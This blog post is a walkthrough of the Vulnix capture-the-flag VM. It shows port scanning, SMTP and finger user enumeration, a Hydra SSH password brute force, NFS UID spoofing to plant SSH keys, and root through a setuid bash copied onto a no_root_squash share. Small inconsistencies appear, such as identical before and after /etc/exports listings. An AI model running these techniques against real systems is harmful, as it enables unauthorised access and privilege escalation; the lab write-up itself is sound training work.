---
layout: post
title: "Vulnix Walthrough (Vulnhub)"
date: 2016-10-31 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough]
---

Vulnix is a challenging vulnerable VM, you can download it from  [Vulnhub](https://www.vulnhub.com/entry/hacklab-vulnix,48/  ). Thanks to [Rebootuser](https://www.rebootuser.com/) for creating this fun challenge!

I assume the VM is loaded correctly and DHCP successfully assigned it an IP. The VM needs to be on the same network as the attacking machine as well.

## 0\. Get VM's IP

An easy way for this is running `netdiscover` on the subnet your machine is on. Keep in mind that this could fail due to various reasons, so running `nmap -F -Pn` for the subnet is a good alternative.

```console
root@kali:~# netdiscover -r 192.168.1.0/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

264 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 15840
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
...
192.168.1.72    c4:e9:84:10:d3:5e      4     240  TP-LINK TECHNOLOGIES CO.,LTD.
...

```

VMs IP is: `192.168.1.72`.

## 1\. Enumeration

Enumeration is an important part of pentesting, debatable to be the most important step. In this step we'll be enumeration services running on victim as well as users, shares, RPC info, ...

### 1.1 Services Enumeration

You don't usually need to scan all ports, top 1000 are usually good for starting, but in this example all ports will be scanned for TCP services.

```console
root@kali:~# nmap -p- -sS -A 192.168.1.72

Starting Nmap 7.30 ( https://nmap.org ) at 2016-10-30 20:12 EDT
Nmap scan report for 192.168.1.72
Host is up (0.00026s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE    VERSION
**22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)**
| ssh-hostkey:
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
**25/tcp    open  smtp       Postfix smtpd**
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
|_ssl-date: 2016-10-31T00:13:39+00:00; +4s from scanner time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
**110/tcp   open  pop3       Dovecot pop3d**
|_pop3-capabilities: RESP-CODES SASL STLS CAPA UIDL PIPELINING TOP
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2016-10-31T00:13:39+00:00; +4s from scanner time.
**111/tcp   open  rpcbind    2-4 (RPC #100000)**
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      48347/tcp  mountd
|   100005  1,2,3      49907/udp  mountd
|   100021  1,3,4      38110/udp  nlockmgr
|   100021  1,3,4      57686/tcp  nlockmgr
|   100024  1          57991/udp  status
|   100024  1          60005/tcp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
**143/tcp   open  imap       Dovecot imapd**
|_imap-capabilities: ENABLE more post-login STARTTLS LOGIN-REFERRALS IDLE LOGINDISABLEDA0001 LITERAL+ SASL-IR capabilities IMAP4rev1 listed Pre-login have ID OK
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2016-10-31T00:13:39+00:00; +4s from scanner time.
**512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd**
|_imap-capabilities: more AUTH=PLAINA0001 listed LOGIN-REFERRALS IDLE post-login LITERAL+ SASL-IR capabilities IMAP4rev1 Pre-login ENABLE have ID OK
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2016-10-31T00:13:39+00:00; +5s from scanner time.
**995/tcp   open  ssl/pop3   Dovecot pop3d**
|_pop3-capabilities: RESP-CODES USER SASL(PLAIN) CAPA UIDL PIPELINING TOP
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2016-10-31T00:13:39+00:00; +5s from scanner time.
**2049/tcp  open  nfs_acl    2-3 (RPC #100227)
37660/tcp open  mountd     1-3 (RPC #100005)
44588/tcp open  mountd     1-3 (RPC #100005)
48347/tcp open  mountd     1-3 (RPC #100005)
57686/tcp open  nlockmgr   1-4 (RPC #100021)
60005/tcp open  status     1 (RPC #100024)**
MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)
Device type: general purpose
**Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10**
Network Distance: 1 hop
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4s, deviation: 1s, median: 4s

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.1.72

Post-scan script results:
| clock-skew:
|_  4s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.03 seconds
```

Great, we got many services running, notables are:

* Port 22: SSH
* Port 25: SMTP
* Port 79: Finger
* Port 110: POP3
* Port 111: RPCbind
* Port 143: IMAP
* Port 512: RSH (Remote shell)
* Port 513: RLogin
* Port 514: shell?

### 1.2 Users enumeration

A usually useful tool for enumeration (including user enum) would be `enum4linux`. Unfortunately, it didn't reveal any useful information.

Since we have SMTP service running maybe we can also make use of the `VRFY`
command if it's not disabled.

```console
root@kali:~# nc -nv 192.168.1.72 25
(UNKNOWN) [192.168.1.72] 25 (smtp) open
220 vulnix ESMTP Postfix (Ubuntu)
VRFY vulnix
252 2.0.0 vulnix
VRFY abatchy
550 5.1.1 <abatchy>: Recipient address rejected: User unknown in local recipient table
```

We were able to verify that the user vulnix exists, verifying a non existing user shows us an error message. We might be able to enumerate more users using this method. For that we'll use the sexy [smtp-user-enum](http://tools.kali.org/information-gathering/smtp-user-enum) script found in Kali.

We can use `/usr/share/metasploit-framework/data/wordlists/unix_users.txt` which is provided in the metasploit framework.

```console
root@kali:~# smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.72
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt
Target count ............. 1
Username count ........... 112
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Sun Oct 30 23:10:22 2016 #########
192.168.1.72: ROOT exists
192.168.1.72: backup exists
192.168.1.72: bin exists
192.168.1.72: daemon exists
192.168.1.72: games exists
192.168.1.72: gnats exists
192.168.1.72: irc exists
192.168.1.72: libuuid exists
192.168.1.72: list exists
192.168.1.72: lp exists
192.168.1.72: man exists
192.168.1.72: messagebus exists
192.168.1.72: mail exists
192.168.1.72: news exists
192.168.1.72: nobody exists
192.168.1.72: postmaster exists
192.168.1.72: proxy exists
192.168.1.72: root exists
192.168.1.72: sshd exists
192.168.1.72: sync exists
192.168.1.72: sys exists
192.168.1.72: syslog exists
**192.168.1.72: user exists**
192.168.1.72: uucp exists
192.168.1.72: www-data exists
_#_####### Scan completed at Sun Oct 30 23:10:23 2016 #########
25 results.

112 queries in 1 seconds (112.0 queries / sec)
```

Took me a while to figure out, but the username user is not a common one. Let's try running [finger](https://en.wikipedia.org/wiki/Finger_protocol) against the two  usernames we found (vulnix and user).

```console
root@kali:~# finger user@192.168.1.72
Login: user              Name: user
Directory: /home/user                Shell: /bin/bash
Never logged in.
No mail.
No Plan.

Login: dovenull          Name: Dovecot login user
Directory: /nonexistent              Shell: /bin/false
Never logged in.
No mail.
No Plan.
root@kali:~# finger vulnix@192.168.1.72
Login: vulnix            Name:
Directory: /home/vulnix              Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```

Good, both users are valid.

### 1.2 NFS enumeration

Since we have NFS service running on port 2069, we may be able to mount a
share and find some juicy data!
You'll need to install `nfs-common` package if it doesn't exist already.

```console
root@kali:~# showmount -h
Usage: showmount [-adehv]
[--all] [--directories] [--exports]
[--no-headers] [--help] [--version] [host]
root@kali:~# showmount 192.168.1.72
Hosts on 192.168.1.72:
root@kali:~# showmount -e 192.168.1.72
Export list for 192.168.1.72:
/home/vulnix *
root@kali:~# mkdir /tmp/nfs
root@kali:~# mount -t nfs 192.168.1.72:/home/vulnix /tmp/nfs -nolock
root@kali:~# cd /tmp
root@kali:/tmp# ls -al
total 52
drwxrwxrwt 12 root       root       4096 Oct 30 23:22 .
drwxr-xr-x 22 root       root       4096 Sep 29 03:47 ..
...
drwxr-x---  2 nobody     4294967294 4096 Sep  2  2012 nfs
...
root@kali:/tmp# cd /tmp/nfs
bash: cd: /tmp/nfs: Permission denied
```

The mounted share cannot be accessed, probably because the [root_squash flag is set](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/sect-Security_Guide-Securing_NFS-Do_Not_Use_the_no_root_squash_Option.html). We can safely assume if we have a user named vulnix with the same UID we'll be able to access it. But we'll get back to this later.

## 2\. Gaining Access

After wasting a decent amount of time on finding exploits for running services, I wasn't able to find any, don't do that, there are services we didn't explore more properly in the first place.

### 2.1 Bruteforcing SSH

Running Hydra against either user or vulnix is an option with rockyou wordlist, although this will take a very long time (unless you try user `user` first)!

```console
root@kali:~# hydra -l user -P rockyou.txt 192.168.1.72 ssh -t 4
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-10-30 23:43:08
[DATA] max 4 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~56032 tries per task
[DATA] attacking service ssh on port 22
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active
[STATUS] 61.33 tries/min, 184 tries in 00:03h, 14344215 to do in 3897:54h, 4 active
[STATUS] 60.71 tries/min, 425 tries in 00:07h, 14343974 to do in 3937:34h, 4 active
[22][ssh] host: 192.168.1.72   login: user   password: letmein
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2016-10-30 23:51:39
```

### 2.2 Privilege escalation P1

We can now ssh into the victim's machine as user `user` but there's not much to do unfortunately. GCC isn't installed so a local exploit won't work since they're written in C.

If you navigate to `/home you'll notice the shared directory we couldn't access earlier. Why don't we try to get the UID for vulnix and create a temporary user on our system and access it?

```console
user@vulnix:/home$ id vulnix
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
user@vulnix:/home$ exit
logout
Connection to 192.168.1.72 closed.
root@kali:~# useradd -u 2008 vulnix
root@kali:~# mkdir /tmp/mnt
root@kali:~# mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt -nolock
root@kali:~# cd /tmp/mnt
bash: cd: /tmp/mnt: Permission denied
root@kali:~# su vulnix
$ whoami
vulnix
$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
$ cd /tmp/mnt
$ ls
$ ls -al
total 20
drwxr-x---  2 vulnix vulnix 4096 Sep  2  2012 .
drwxrwxrwt 12 root   root   4096 Oct 31 00:03 ..
-rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile
$
```

Let's generate keys for SSH so we can login into vulnix!

Steps:

1. Create ssh key pair by running `ssh-keygen`.
2. Create `.ssh` directory on the mounted share `/home/vulnix/.ssh`.
3. Copy the content of the public key to `/home/vulnix/.ssh`.
4. SSH into `vulnix@_victim_ip_`!

```console
root@kali:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:jAQAkGBjXyvc8yD2eGxR1fxY1z3nh/rxUFfuyfH3Uoc root@kali
The key's randomart image is:
+---[RSA 2048]----+
|**.... ...o     o|
|+ + o.o    o . o=|
|   * *.     + .++|
|  . *.=o   . ...*|
|   . =..S    ..+*|
|    o       . Eo*|
|             . =+|
|              o o|
|               . |
+----[SHA256]-----+
root@kali:~# cd .ssh
root@kali:~/.ssh# ls
id_rsa  id_rsa.pub  known_hosts
root@kali:~/.ssh# su vulnix
$ cd /tmp/mnt
$ mkdir .ssh
$ cd .ssh
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV+bAWn9J+xwfVKkNd/TpwysAEVAU321XBxwc0qt8OXRJZC71/UOr/2m/QCeneJH/o0d4IiaZSJQWOTwVlpRvBeTLTRLu8T5OgOGjTF2TEL6Z8ILif2RS5QuPjFRRoW4TOvApNbcqpzkVtXcCQLlxXkO1KNA01LapaTfhh48l+bpzjlujFQTaw3m5FXB1aQASkweZLwF2T0+2anvX0gtB2QKwePbwb4zEIpcVHrucCe3j9Z2KYE7GcyJiOEUEyXi39GsypR3fRCcJTx2/TXkhByjkYgFJjnoBd/koMfpnWjtVHj+d6y97f1Srkrv+RB5mNiYcMN+W4bAU2m11163kr root@kali > authorized_keys
$ exit
root@kali:~/.ssh# ssh vulnix@192.168.1.72
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

* Documentation:  https://help.ubuntu.com/

System information as of Mon Oct 31 04:09:44 GMT 2016

System load:  0.0              Processes:           89
Usage of /:   93.3% of 773MB   Users logged in:     0
Memory usage: 13%              IP address for eth0: 192.168.1.72
Swap usage:   0%

=> / is using 93.3% of 773MB

Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$
```

### 2.3 Privilege Escalation P2 (ROOT!)

I was very lucky to notice this straight away that running `sudo -l` shows that I'm allowed to edit `/etc/exports`. This way I can add an entry for the entire directory and do whatever I want.

Yet one problem stood in the way, how do I restart the VM so the changes take place? Not sure what other people think about this  but unfortunately the author's walkthrough was to restart the VM. I'm very against this as in a pentest, I don't have access to the physical machine, if I can't reboot it with my current privilege, I won't be able to restart it.

Also due to the fact that there's a secure_path set, we can't manipulate the `PATH` variable (except by running `sudo -e` which we can't).

```console
vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#  to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix *(rw,root_squash)
/root  *(rw, no_root_squash)

vulnix@vulnix:~$
```

Let's edit the file and update `/home/vulnix` so we're able to

```console
vulnix@vulnix:~$ sudoedit /etc/exports
vulnix@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#  to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix *(rw,root_squash)
/root  *(rw, no_root_squash)

vulnix@vulnix:~$
```


Restart the VM and remount the shared directory. We can upload a local exploit to gain root, or just copy `/bin/bash` and give it setuid permissions.

We'll run `bash` with `-p` flag to keep the original file's permissions.

```console
root@kali:/tmp# mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt
root@kali:/tmp# cd mnt
root@kali:/tmp/mnt# cp /bin/bash .
root@kali:/tmp/mnt# chmod 4777 bash
root@kali:/tmp/mnt# ls -al
total 1180
drwxr-x---  5 vulnix vulnix    4096 Oct 31 00:41 .
drwxrwxrwt 12 root   root      4096 Oct 31 00:39 ..
-rwsrwxrwx  1 root   root   1171072 Oct 31 00:41 bash
-rw-------  1 vulnix vulnix       0 Oct 31 00:31 .bash_history
-rw-r--r--  1 vulnix vulnix     220 Apr  3  2012 .bash_logout
-rw-r--r--  1 vulnix vulnix    3486 Apr  3  2012 .bashrc
drwx------  2 vulnix vulnix    4096 Oct 31 00:09 .cache
-rw-r--r--  1 vulnix vulnix     675 Apr  3  2012 .profile
drwxr-xr-x  2 vulnix vulnix    4096 Oct 31 00:09 .ssh
root@kali:/tmp/mnt# ssh vulnix@192.168.1.72
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

* Documentation:  https://help.ubuntu.com/

System information as of Mon Oct 31 04:41:47 GMT 2016

System load:  0.0              Processes:           90
Usage of /:   93.5% of 773MB   Users logged in:     0
Memory usage: 7%               IP address for eth0: 192.168.1.72
Swap usage:   0%

=> / is using 93.5% of 773MB

Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Oct 31 04:31:08 2016 from 192.168.1.71
vulnix@vulnix:~$ ls -al
total 1180
drwxr-x--- 5 vulnix vulnix    4096 Oct 31 04:41 .
drwxr-xr-x 4 root   root      4096 Sep  2  2012 ..
-rwsrwxrwx 1 root   root   1171072 Oct 31 04:41 bash
-rw------- 1 vulnix vulnix       0 Oct 31 04:31 .bash_history
-rw-r--r-- 1 vulnix vulnix     220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix    3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix    4096 Oct 31 04:09 .cache
-rw-r--r-- 1 vulnix vulnix     675 Apr  3  2012 .profile
drwxr-xr-x 2 vulnix vulnix    4096 Oct 31 04:09 .ssh
vulnix@vulnix:~$ ./bash -p
./bash: /lib/i386-linux-gnu/libtinfo.so.5: no version information available (required by ./bash)
bash-4.4# whoami
root
bash-4.4# ls /root
trophy.txt
bash-4.4# cat /root/trophy.txt
cc614640424f5bd60ce5d5264899c3be
```

_____________________________________________________________________________

This VM isn't the easiest, I wasn't able to find about user `user` due to missing SMTP enumeration. Also the trick where I needed to restart the VM stalled me for a long time. Still a pretty fun challenge.

#### Final notes

* Enumeration is important, without knowing there's a user called `user` you most likely won't be able to solve this VM. Doesn't matter which service you use, you can enumerate SMTP, Finger, NFS, ...
* Restarting the VM shouldn't be done via the VMware (or whatever hypervisor you use) since it's considered not part of the attack surface. A workaround for that is that you can reboot the VM with the current privileges like through `sudo`.

\-Abatchy

